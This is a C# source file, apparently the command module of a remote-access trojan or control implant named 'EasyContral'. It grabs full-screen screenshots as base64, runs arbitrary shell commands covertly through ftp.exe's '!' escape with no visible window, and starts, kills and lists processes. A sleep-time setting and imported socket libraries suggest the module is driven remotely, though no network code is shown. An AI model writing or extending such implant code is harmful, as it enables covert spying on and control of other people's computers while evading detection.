using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace EasyContral
{
    internal class GeneralContral
    {
        public static int SleepTime { get; set; }
        public static string ScreenShot()
        {
            return CaptureScreenToBase64();
        }
        static string CaptureScreenToBase64()
        {
            Rectangle bounds = Screen.GetBounds(Point.Empty);
            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                }
                using (MemoryStream ms = new MemoryStream())
                {
                    bitmap.Save(ms, ImageFormat.Png);
                    byte[] imageBytes = ms.ToArray();
                    return Convert.ToBase64String(imageBytes);
                }
            }
        }
        public static string Shell(string command)
        {
            string output = "";
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = "ftp.exe";
            startInfo.UseShellExecute = false;
            startInfo.RedirectStandardOutput = true;
            startInfo.RedirectStandardInput = true;
            startInfo.CreateNoWindow = true;
            using (Process process = Process.Start(startInfo))
            {
                process.StandardInput.WriteLine("!" + command);
                process.StandardInput.WriteLine("bye");
                process.WaitForExit();
                output = process.StandardOutput.ReadToEnd();
            }
            return output;
        }
        public static void StartProcess(string path)
        {
            Process process = new Process();
            process.StartInfo.FileName = path;
            process.StartInfo.UseShellExecute = true;
            process.StartInfo.CreateNoWindow = true;
            process.Start();
        }
        public static void KillProcess(string id)
        {
            Process[] processes = Process.GetProcesses();
            foreach (Process process in processes)
            {
                string processId = process.Id.ToString();
                if (processId == id)
                {
                    process.Kill();
                }
            }
        }
        public static Dictionary<string, Dictionary<string,string>> AllProcess()
        {
            Process[] processes = Process.GetProcesses();
            Dictionary<string, Dictionary<string, string>> Processs = new Dictionary<string, Dictionary<string, string>>();
            foreach (Process process in processes)
            {
                Dictionary<string, string> Dicprocess = new Dictionary<string, string>();
                string processName = process.ProcessName;
                int processId = process.Id;
                int sessionId = process.SessionId;
                long memoryUsage = process.WorkingSet64;
                Dicprocess.Add("ProcessName", processName);
                Dicprocess.Add("ProcessId", processId.ToString());
                Dicprocess.Add("SessionId", sessionId.ToString());
                Dicprocess.Add("MemoryUsage", memoryUsage.ToString());
                Processs.Add(processId.ToString(), Dicprocess);
            }
            return Processs;
        }
    }
}
